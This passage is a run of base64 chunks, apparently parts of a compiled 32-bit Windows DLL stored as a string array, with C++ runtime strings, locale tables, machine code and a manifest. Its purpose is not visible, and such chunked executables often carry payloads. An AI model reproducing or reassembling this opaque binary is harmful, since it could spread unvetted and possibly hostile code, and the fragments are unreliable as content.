0cnVjdG9yIGNsb3N1cmUnAABgdWR0IHJldHVybmluZycAYEVIAGBSVFRJAAAAYGxvY2FsIHZmdGFibGUnAGBsb2NhbCB2ZnRhYmxlIGNvbnN0cnVjdG9yIGNsb3N1cmUnACBuZXdbXQAAIGRlbGV0ZVtdAAAAYG9tbmkgY2FsbHNpZycAAGBwbGFjZW1lbnQgZGVsZXRlIGNsb3N1cmUnAABgcGxhY2VtZW50IGRlbGV0ZVtdIGNsb3N1cmUnAAAAAGBtYW5hZ2VkIHZlY3RvciBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAABgbWFuYWdlZCB2ZWN0b3IgZGVzdHJ1Y3RvciBpdGVyYXRvcicAAAAAYGVoIHZlY3RvciBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAGBlaCB2ZWN0b3IgdmJhc2UgY29weSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAYGR5bmFtaWMgaW5pdGlhbGl6ZXIgZm9yICcAAGBkeW5hbWljIGF0ZXhpdCBkZXN0cnVjdG9yIGZvciAnAAAAAGB2ZWN0b3IgY29weSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAGB2ZWN0b3IgdmJhc2UgY29weSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAAAAYG1hbmFnZWQgdmVjdG9yIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAABgbG9jYWwgc3RhdGljIHRocmVhZCBndWFyZCcAIFR5cGUgRGVzY3JpcHRvcicAAAAgQmFzZSBDbGFzcyBEZXNjcmlwdG9yIGF0ICgAIEJhc2UgQ2xhc3MgQXJyYXknAAAgQ2xhc3MgSGllcmFyY2h5IERlc2NyaXB0b3InAAAAACBDb21wbGV0ZSBPYmplY3QgTG9jYXRvcicAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAgACAAIAAgACAAIAAgACAAKAAoACgAKAAoACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEgAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAhACEAIQAhACEAIQAhACEAIQAhAAQABAAEAAQABAAEAAQAIEAgQCBAIEAgQCBAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQAQABAAEAAQABAAEACCAIIAggCCAIIAggACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAEAAQABAAEAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAIAAgACAAIAAgACAAIAAgAGgAKAAoACgAKAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA','H+EQBEF9ew8zMzMzMzMzMzMzMVYvsUYtVCFOLAleKC','AAAAIvxiXXwxwYoRAEQx0X8AAAAAOhFAAAAi0YMhcB0CVDoECoAAIPEBGjwQgAQahBqFI1GXFDHRfz/////6KYuAACLTfRkiQ0AAAAAWV6L5V3DzMzMzMzMzMzMzMzMVleNcWS/EAAAAI2bAAAAAIM+AHQniw6LAYlGCItJBIXJdAaLAWoB/xD/NuioKQAAi0YIg8QEiQaFwHXZx0YEAAAAAMcGAAAAAMdGCAAAAADHRvwAAAAAg8YUT3WzX17DVYvsU1aLdQwz0leL2YX2fimLfRSLRQiLSwgPt0kI0emNBEhmi00QZjlI/nUZZosMV0JmiUj+O9Z83V9euAEAAABbXcIQAF9eM8BbXcIQAMxVi+xq/2i+6QAQZKEAAAAAUFFTVlehwHABEDPFUI1F9GSjAAAAAIv5i3UIiwaDwPA9oAAAAA+HzAIAAA+2gLQyABD/JIWMMgAQaizoKCkAAIPEBIXAD4Q','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BrAC0ATQBLAAAAdABuAC0AWgBBAAAAeABoAC0AWgBBAAAAegB1AC0AWgBBAAAAYQBmAC0AWgBBAAAAawBhAC0ARwBFAAAAZgBvAC0ARgBPAAAAaABpAC0ASQBOAAAAbQB0AC0ATQBUAAAAcwBlAC0ATgBPAAAAbQBzAC0ATQBZAAAAawBrAC0ASwBaAAAAawB5AC0ASwBHAAAAcwB3AC0ASwBFAAAAdQB6AC0AVQBaAC0ATABhAHQAbgAAAAAAdAB0AC0AUgBVAAAAYgBuAC0ASQBOAAAAcABhAC0ASQBOAAAAZwB1AC0ASQBOAAAAdABhAC0ASQBOAAAAdABlAC0ASQBOAAAAa','HFMcH5EQBEIl3HA+3RhQDxolHIItGEIlHJNHox0X8AAAAAIlHMDPJQLoCAAAA9+IPkMHHB3BEARD32QvIUehmKwAAiUcoi0cwQFDoWSsAAP93JIlHLP93IP93KOjPPQAAi0coi08w','cBwARAzxVCNRfRkowAAAACL8Yl18MdGEAAAAADHRggAAAAAx0YMAAAAAMdF/AAAAADHBmhEARDHRhQBAAAAx0YYAAAAAMdGBAAAAADou/r//4vGi030ZIkNAAAAAFlei+Vdw8zMzMzMzMzMzFWL7Gr/aCjoABBkoQAAAABQUVahwHABEDPFUI1F9GSjAAAAAIvxiXXwx0YQAAAAAMdGBAAAAADHRggAAAAAx0YMAAAAAItFCMdF/AAAAADHBmhEARDHRhQAAAAAiUYYZoN4CgB0C4PAEIlGBOgv+v//i8aLTfRkiQ0AAAAAWV6L5V3CBADMzMzMzMzMzMzMzFWL7FOL2YN7FAB0U4tDGMdDEAEAAACFwHQQUOhYMQAAg8QEx0MYAAAAAFZXi30Ii3cYD7dGCFDobSkAAIlDGA+3TghRVlDo5TsAAItDGIPEEIPAEFBXi8voM/n//19ei8NbXcIEAMzMzMzMzMzMzMxVi+xWi/GDfhAAxwZoRAEQdBCLRhiFwHQJUOjpMAAAg8QEi0YIxwa0RAEQhcB0CVDo0zAAAIPEBPZFCAF0CVboxDAAAIPEBIvGXl3CBADMzFaL8YtGFMcGYEQBEIXAdAlQ6KIwAACDxATHBghEARCLzl7paRsAAMzMzMzMzMzMzFWL7FaL8YtGFMcGYEQBEIXAdAlQ6G8wAACDxASLzscGCEQBEOg3GwAA9kUIAXQJVuhTMAAAg8QEi8ZeXcIEAMxVi+xq/2gD6AAQZKEAAAAAUFFWV6HAcAEQM8VQjUX0ZKMAAAAAi/mJffCLdQiLVQzHB/hEARCJdwSJVxiLQghmi0AIZolHCItCCItADIlHDItCCItAFIlHEItCCItAIIlHFMcH5EQBEIl3HA+3RhQDxolHIItGEIlHJMdF/AAAAADHRygIRAEQx0c0AAAAAMdHMAAAAADHRzgAAAAAx0csAAAAAMZF/AGLRyDHB0xEARDHRyhERAEQiUc8gzgwdQXomwAAAIvHi030ZIkNAAAAAFlfXovlXcIIAMzMzMzMzFWL7Gr/aOjoABBkoQAAAABQUVahwHABEDPFUI1F9GSjAAAAAIvxiXXwjU4oxwZMRAEQxwFERAEQx0X8AAAAAMcBCEQBEOj2GQAA9kUIAccG+EQBEHQJVugMLwAAg8QEi8aLTfRkiQ0AAAAAWV6L5V3CBADMzMzMzMzMzMzMzMzMVYvsav9oI+oAEGShAAAAAFCD7AhTVlehwHABEDPFUI1F9GSjAAAAAIvZi1M8jXoQA3oQD7dHCIlF8DtCFA+HuAAAAGoc6O4uAACL8IPEBIl17MdF/AAAAACF9nRGx0YQAAAAAMdGBAAAAADHRggAAAAAx0YMAAAAAMZF/AHHBmhEARDHRhQAAAAAiX4YZoN/CgB0EY1HEIvOiUYE6N/2///rAjP2agjHRfz/////6IUuAACDxASFwHQdiXAExwAAAAAAi0s0hcl1BYlDMOsCiQH/QyyJQzT2RwwCdR4Pt0cIi03wA/gPt0cIA8iLQzyJTfA7SBQPhkj///+LTfRkiQ0AAAAAWV9eW4vlXcPMzMxVi+xTVv91DIvx/3UI6L7t//+DfjQAxwYwRAEQx0ZAAAAAAMdGRAAAAAB0HYtGHGoA/3YQ/3A0/3Aw6DGvAAALy3UGiUZAiVZEi8ZeW13CCADMzMzMzMzM','tACGaJQQiLQgiLQAyJQQyLQgiLQBSJQRCLQgiLQCCJQRTHAeREARCJcRwPt0YUA8aJQSCLRhCJQSSLQSCJQSjHAbxEARCLwV5dwggAzMzMzMzMzMzMVYvsVovxi0YIxwa0RAEQhcB0CVDoLzgAAIPEBPZFCAF0CVboIDgAAIPEBIvGXl3CBADMzMzMzMzMzMzMzMzMzItBCMcBtEQBEIXAdAdQ6PU3AABZw8zMzMzMzMzMzMzMVYvsVovxg34QAHRsi0YIhcB0CVDozzcAAIPEBFeLfQiLRwyJRgyLRQyJRgSDfwgAdD6LRgwzyUC6AgAAAPfiD5DB99kLyFHozS8AAP92DIlGCP93CFDoLDgAAItODItGCIPEEDPSX2aJFEheXcIIAMdGCAAAAABfXl3CCADMzMxVi+yB7AwCAAChwHABEDPFiUX8VovxV4tGCIXAdBdQ6EQ3AACDxATHRggAAAAAx0YMAAAAAItGBIXAdDaKSECEyXQvD7b5gf8EAQAAdgT33+sig8BCV1CNhfT9//9Q6KQ3AACDxAwzwGaJhH30/f//6wIz/4l+DIX/fmEzyY1HAboCAAAA9+IPkMH32QvIUegFLwAAM/+DxASJRgg5fgx+Hw+3hH30/f//UOjiOAAAi04IR2aJRHn+g8QEO34MfOG','g8cBg+oBdfaLRCQIX8OLRCQEw1WL7DPSi8I5RQx2EYtNCGY5EXQJQIPBAjtFDHLyXcNVi+yD7BD/dQyNTfDokY3//4tF8A+2TQiLgJAAAAAPtwRIJQCAAACAffwAdAeLTfiDYXD9ycNVi+xqAP91COi9////WVldw6FokAEQVmoUXoXAdQe4AAIAAOsGO8Z9B4vGo2iQARBqBFDoyKj//1lZo2SQARCFwHUeagRWiTVokAEQ6K+o//9ZWaNkkAEQhcB1BWoaWF7DM9K5yHsBEIkMAoPBII1SBIH5SH4BEH0HoWSQARDr6DPAXsPomxAAAIA9wIUBEAB0Beh4EgAA/zVkkAEQ6MWt//+DJWSQARAAWcO4yHsBEMNVi+xWi3UIuch7ARA78XIigf4ofgEQdxqLxivBwfgFg8AQUOh16f//gU4MAIAAAFnrCo1GIFD/FdTwABBeXcNVi+yLRQiD+BR9FoPAEFDoSun//4tFDFmBSAwAgAAAXcOLRQyDwCBQ/xXU8AAQXcNVi+yLRQi5yHsBEDvBch89KH4BEHcYgWAM/3///yvBwfgFg8AQUOhn6v//WV3Dg8AgUP8V2PAAEF3DVYvsi00Ii0UMg/kUfROBYAz/f///jUEQUOg66v//WV3Dg8AgUP8V2PAAEF3DVYvsi0UIhcB1Fegp0f//xwAWAAAA6PDC//+DyP9dw4tAEF3DVYvsi00Ig/n+dQ3oBNH//8cACQAAAOs4hcl4JDsNgKABEHMci8HB+AWD4R+LBIVojAEQweEGD75ECASD4EBdw+jP0P//xwAJAAAA6JbC//8zwF3DahBo2FUBEOjgp///i3UIg/7+dRjoc9D//4MgAOif0P//xwAJAAAA6a0AAACF9g+IjQAAADs1gKABEA+DgQAAAIvewfsFi/6D5x/B5waLBJ1ojAEQD75EOASD4AF0Y1boSREAAFmDZfwAiwSdaIwBEPZEOAQBdBP/dRD/dQxW6F8AAACDxAyL+OsW6DHQ///HAAkAAADo8s///4MgAIPP/4l95MdF/P7////oCgAAAIvH6ymLdQiLfeRW6GcSAABZw+jGz///gyAA6PLP///HAAkAAADoucH//4PI/+hQp///w1WL7LjwGgAA6K0TAAChwHABEDPFiUX8i0UIi00MM9JXi/qJhUDl//+JjUTl//+JvTzl//+JlSz','w1Yz9v+2MHsBEP8VHPAAEImGMHsBEIPGBIP+KHLmXsNVi+yLRQijwI8BEF3D/zXMjwEQ/xUg8AAQw1WL7ItFCKPEjwEQo8iPARCjzI8BEKPQjwEQXcNqJGi4VQEQ6H68//8z24ld4DP/iX3Yi3UIg/4Lf1B0FYvGagJZK8F0IivBdAgrwXReK8F1SOgnz///i/iJfdiF/3UWg8j/6WQBAADHReTEjwEQocSPARDrXv93XFboUwEAAFlZg8AIiUXkiwDrVovGg+gPdDa','c20udjMiPg0KICAgIDxzZWN1cml0eT4NCiAgICAgIDxyZXF1ZXN0ZWRQcml2aWxlZ2VzPg0KICAgICAgICA8cmVxdWVzdGVkRXhlY3V0aW9uTGV2ZWwgbGV2ZWw9J2FzSW52b2tlcicgdWlBY2Nlc3M9J2ZhbHNlJyAvPg0KICAgICAgPC9yZXF1ZXN0ZWRQcml2aWxlZ2VzPg0KICAgIDwvc2VjdXJpdHk+DQogIDwvdHJ1c3RJbmZvPg0KPC9hc3NlbWJseT4NCgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAFgAAAAMMLEw3TAxMWgxkTG9MSwyODJ9M5M0nTSnNFA1ZjV4NRA27DYSNyg3YTcmODc4VDiNOJQ4/DgWOSU5STljOW455zv1OxM8eD+uP8w/6z8AAAAgAACUAAAAJTDKMMoxxjLVMvIyJDNGM28zdTOoM68zyTPoMx40PDRWNGU0gjS0NOU0MTVrNYU1pjW0Nec1JjY0NnE2LDdHN3g3izerN8A35jf1NxI4RDhkOI04lDjGONQ47jj0OAE5EDlGOVg5vzloOgY7GDvFPMo82jxGPVQ9az2MPdY95D37PRw+Bj8WPz4/RT8AMAAAUAAAALwwjDKQMpQymDKcMqAypDKoMqwysDIQNB40SDQ2NUg1xTUrNgc3qjgrObY6yDrmOnc7oTvbPOc8Gj0+PWk9kT22PV4+ij4AAABAAACEAAAAZzHCMvIyYjPSM+Iz+DMuNEY0aDSYNMg0+DSWNaU12zXiNSY4NThYOJA4rzi2OOY69jojO+Y79TsSPEQ8Yzz2PAU9HD0sPTo9VD1jPZY9pD27Pcs92j0LPiI+PD5LPns+kj69PsM+5z7tPhw/Nz9SP20/ej+QP94/6D/zPwBQAAAUAQAAFjAhMEQwTzBkMKMwyzDZMIUyozK8MsMyyzLQMtQy2DIBMyczRTNMM1AzVDNYM1wzYDNkM2gzsjO4M7wzwDPEMyo0NTRQNFc0XDRgNGQ0hTSvNOE06DTsNPA09DT4NPw0ADUENU41VDVYNVw1YDXVNto23zb2Njs3QjdKN7o3vzfIN9Q32TcAOAY4MDioOLI4vTg7OUI5VzlhOWc6bjqBOrk6vzrFOss60TrXOt465TrsOvM6+joBOwg7EDsYOyA7LDs1Ozo7QDtKO1Q7ZDt0O4Q7jTu+O8Q7yjvQO9Y73DvjO+o78Tv4O/87BjwNPBU8HTwlPDA8NTw7PEU8TzxiPGc8dTzdPEw9Aj4NPgBgAADAAAAAEDBIME0wVzCLMKAwqjC0MPUwCzE0MU8xpTG6MdQxNzJlMgMzKzM5M+U0AzUcNSM1KzUwNTQ1ODVhNYc1pTWsNbA1tDW4Nbw1wDXENcg1EjYYNhw2IDYkNoo2lTawNrc2vDbANsQ25TYPN0E3SDdMN1A3VDdYN1w3YDdkN643tDe4N7w3wDfKOQ46LjohO0E7kDuoO607GD0pPT4+XD5+PpQ+2D5XP2E/bz+IP5E/sD+7P8U/1z/hPwBwAAAkAQAAAzAOMIownjCmMK8wuDDYMOEw5zDtMAsx','VujGCAAA/zXchQEQiR3ghQEQ6LUIAAD/NdiFARDoqggAAIPEDIkd3IUBEIkd2IUBEIP//3QPOR0goQEQdAdX6IgIAABZav//FRzwABCjIKEBEKHYjwEQhcB0DVDoawgAAFmJHdiPARCh3I8BEIXAdA1Q6FUIAABZiR3cjwEQ/zXgcAEQ/xU88AAQW4XAdRuh4HABEL7gcwEQO8Z0DVDoKQgAAFmJNeBwARBfXsNVi+zokAUAAP91COjlBQAAWWj/AAAA6KEAAADMagFqAGoA6DEBAACDxAzDVYvsgz0koQEQAHQZaCShARDokkUAAFmFwHQK/3UI/xUkoQEQWehvRgAAaDjxABBoJPEAEOjAAAAAWVmFwHVQVldooacAEOiG5f//Wb4Q8QAQvyDxABDrC4sGhcB0Av/Qg8YEO/dy8YM9GKEBEABfXnQbaBihARDoLEUAAFmFwHQMagBqAmoA/xUYoQEQM8Bdw1WL7GoAagH/dQjojQAAAIPEDF3DVmoA/xUc8AAQi/BW6DcJAABW6CodAABW6CUHAABW6PBFAABW6ARGAABW6N0aAACDxBhe6esXAABVi+xWi3UI6wuLBoXAdAL/0IPGBDt1DHLwXl3DVYvsVot1CDPA6w+FwHUQiw6FyXQC/9GDxgQ7dQxy7F5dw2oI6LlCAABZw2oI6BREAABZw2ocaMhSARDoPwIAAGoI6JtCAABZg2X8AIM90IUBEAEPhMkAAADHBcSFARABAAAAikUQosCFARCDfQwAD4WcAAAA/zUgoQEQizUg8AAQ/9aL2Ild1IXbdHT/NRyhARD/1ov4iV3kiX3giX3cg+8EiX3cO/tyV2oA/xUc8AAQOQd06jv7ckf/N//Wi/BqAP8VHPAAEIkH/9b/NSChARCLNSDwABD/1olF2P81HKEBEP/Wi03YOU3kdQU5ReB0rolN5IvZiV3UiUXgi/jrnGhM8QAQaDzxABDo1f7//1lZaFTxABBoUPEAEOjE/v//WVnHRfz+////6CAAAACDfRAAdSnHBdCFARABAAAAagjoAUMAAFn/dQjoaPz//4N9EAB0CGoI6OtCAABZw+hiAQAAw1WL7IN9CAB1FejiKQAAxwAWAAAA6KkbAACDyP9dw/91CGoA/zVgjAEQ/xVM8AAQXcNVi+xWVzP2agD/dQz/dQjo6UYAAIv4g8QMhf91JzkF8IUBEHYfVv8VUPAAEI2O6AMAAIvxOw3whQEQdgODzv+D/v91w4vHX15dw1WL7FNWV4s98IUBEDP2/3UI6EgGAACL2FmF23Ulhf90IVb/FVDwABCLPfCFARCNjugDAACL8TvPdgODzv+D/v91zF9ei8NbXcNVi+xWVzP2/3UM/3UI6K1FAACL+FlZhf91LDlFDHQnOQXwhQEQdh9W/xVQ8AAQjYboAwAAi/A7BfCFARB2A4PO/4P+/3XBi8dfXl3DzMzMzMzMzMzMzMzMaPB1ABBk/zUAAAAAi0QkEIlsJBCNbCQQK+BTVlehwHABEDFF/DPFUIll6P91+ItF/MdF/P7///+JRfiNRfBkowAAAADDi03wZIkNAAAAAFlfX15bi+VdUcPMzMzMzMzMVYvsg+wYU4tdDFZXi3sIMz3AcAEQxkX/AMdF9AEAAACLB41zEIP4/nQNi08EA84zDDDoO9r//4tPDItHCAPOMwww6Cva//+LRQj2QARmD4XQAAAAiUXoi0UQiUXsjUXoiUP8i0MMiUX4g/j+D4TuAAAAjQRAjUAEi0yHBIsch40Eh4lF8IXJdHuL1uiSRgAAsQGITf+FwA+IfgAAAH5oi0UIgThjc23gdSiDPTgSARAAdB9oOBIBEOgTQQAAg8QEhcB0DmoB/3UI/xU4EgEQg8QIi1UIi00M6HVGAACLRQyLVfg5UAx0EGjAcAEQVovI6HZGAACLRQyJWAyLB4P4/nR162aKTf+Lw4ld+IP7/g+FXf///4TJdEfrIcdF9AAAAADrGIN7DP50NmjAcAEQVovLuv7////oL0YAAIsHg/j+dA2LTwQDzjMMMOgi2f//i08Mi1cIA84zDDLoEtn//4tF9F9eW4vlXcOLTwQDzjMMMOj72P//i08Mi0cIA84zDDDo69j//4tN8IvWi0kI6KVFAADMagPohUcAAFmD+AF0FW','RBH4iYXY/f//i0QR/ImF3P3//42F2P3///+17P3//4uN6P3//1NQ6Gj7//+FwHU8i3c4hfZ0FIs2iXc4hfZ0C4t2BIX2D4Up////M8BfXluLTfwzzehsFgAAi+VdwggAi43s/f//Vuio7P//i038X14zzbgBAAAAW+hIFgAAi+VdwggAVYvsi9GLgvAAAACJgvgAAACFwHQFi0AE6wIzwIXAdCqLSASAeQkAdCGLgvgAAACFwHQRiwCJgvgAAACFwHQFi0AE6wIzwIXAddZdwgQAzMyLQWSJQWyFwHQTi0AEhcB0DItAKItAICUACAAAwzPAw4tBZIlBbIXAdBOLQASFwHQMi0Aoi0AgJQBAAADDM8DDVYvsav9of+gAEGShAAAAAFCB7LABAAChwHABEDPFiUXsVlCNRfRkowAAAACL8f91CA9XwMcGIEQBEMdGIP/////HRiQAAAAAx0ZsAAAAAMdGcAAAAAAzwGaJRmhmD9ZGKGYP1kYwZg/WRjhmD9ZGQGYP1kZIZg/WRlBmD9ZGWGYP1kZg6NcBAACFwA+EaQEAAFaNjUz+///oc/H//2oAx0X8AAAAAGoDjY1M/v//x4Wk/v//YwAAAOgT+f//hcB1UMeFTP7//yhEARCNjUz+///HRfwBAAAA6MPy//+LhVj+//+FwHQJUOiLHAAAg8QEaPBCABBqEGoUjYWo/v//UMdF/P/////oHiEAAOnpAAAAjY1M/v//6IT7//+LhSj///+JhTD///+FwHQFi0AE6wIzwIXAD4StAAAAi0AoD7ZICA+2QAlmweEIZgvIuAADAABmiU5oZjvID4KJAAAAaKABAADHRiQBAAAA6FgcAACDxASJhUj+///GRfwChcB0ClaLyOiH8P//6wIzwMZF/ACJRmxqAMdAWIMAAACLTmxqAOgp+P//hcB0PYtObOjt+v//i0Zsi4jwAAAAiYj4AAAAhcl0BYtBBOsCM8CJRnCFw','Ar01KL04PiA3QGiAFBSnX6wesCdApmD34BjUkES3X2Wule////ahBoQFYBEOjQlv//M/+JfeRqA